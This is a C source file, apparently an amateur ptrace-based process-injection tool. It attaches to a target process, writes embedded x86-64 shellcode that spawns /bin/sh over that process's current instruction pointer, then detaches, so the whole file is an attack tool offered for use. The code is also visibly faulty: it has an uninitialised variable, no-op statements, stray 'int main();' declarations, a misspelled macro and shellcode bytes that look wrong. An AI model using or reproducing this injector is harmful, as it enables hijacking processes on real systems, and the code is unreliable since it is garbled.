#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <stdint.h>

#include <sys/ptrace.h>

#include <sys/types.h>

#include <sys/wait.h>

#include <unistd.h>

#include <sys/user.h>

#include <sys/reg.h>
 //prety much done 
//will need work my ide had broken
#define QUOTE_MACRO_VALUE(MACRO) #MACRO

#define print_definition(MACRO) printf("%-24s = %s\n", #MACRO, QUOTE_MACRO_VALUE(MACRO))

#define print_undefined(MACRO) printf("%-24s = n/a\n", #MACRO)

void proc() //dtects the arc in runtime
{
  int check_val;
  #ifdef __amd64
  print_definition(__amd64); //def for x86 needs to be done for intel
  #else
  print_undefined(__amd64);
  check_val + 1;
  int main();
  #endif
  //intel stuffs
  #ifdef _BYTE_OEDER_
  print_definition(__BYTE_ORDER__);
  #else
  int main();
  check_val + 1;
  print_undefined(__BYTE_ORDER__);
  #endif
  if (check_val > 1) {
    exit(0);
  }

}
#define SHELLCODE_SIZE 32
unsigned char * shellcode =
  "\x48\x31\xc0\x48\x89\xc2\x48\x89"
"\xc6\x48\x8d\x3d\x04\x00\x00\x00"
"\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
"\x2f\x73\x68\x00\xcc\x90\x90\x90";
int inject_data(pid_t pid, unsigned char * src, void * dst, int len) {

  void detect();
  int i;
  uint32_t * s = (uint32_t * ) src;
  uint32_t * d = (uint32_t * ) dst;
  for (i = 0; i < len; i += 4, s++, d++) {
    if ((ptrace(PTRACE_POKETEXT, pid, d, * s)) < 0) {
      perror("ptrace(POKETEXT):");
      return -1;
    }
  }
  return 0;
}

int main(int argc, char * argv[]) {
  proc();
  pid_t target;
  struct user_regs_struct regs;
  int syscall;
  long dst;

  if (argc != 2) {
    fprintf(stderr, "Usage:\n\t%s pid\n", argv[0]);
    exit(1);
  }
  target = atoi(argv[1]);
  printf("+  process %d\n", target);

  if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0) {
    perror("ptrace(ATTACH):");
    exit(1);
  }
  printf("+attackes procses::\n");
  wait(NULL);
  printf("Regs::");
  if ((ptrace(PTRACE_GETREGS, target, NULL, & regs)) < 0) {
    perror("ptrace(GETREGS):");
    exit(1);
  }
  /* Inject code into current RPI position */
  printf("shell code and hat reg ID  %p\n", (void * ) regs.rip);
  inject_data(target, shellcode, (void * ) regs.rip, SHELLCODE_SIZE);
  regs.rip += 2;
  printf("+ pointer instructions set to %p\n", (void * ) regs.rip);
  if ((ptrace(PTRACE_SETREGS, target, NULL, & regs)) < 0) {
    perror("ptrace(GETREGS):");
    exit(1);
  }
  printf("+ shell code runs UWU!\n");
  if ((ptrace(PTRACE_DETACH, target, NULL, NULL)) < 0) {
    perror("ptrace(DETACH):");
    exit(1);
  }
  return 0;
}
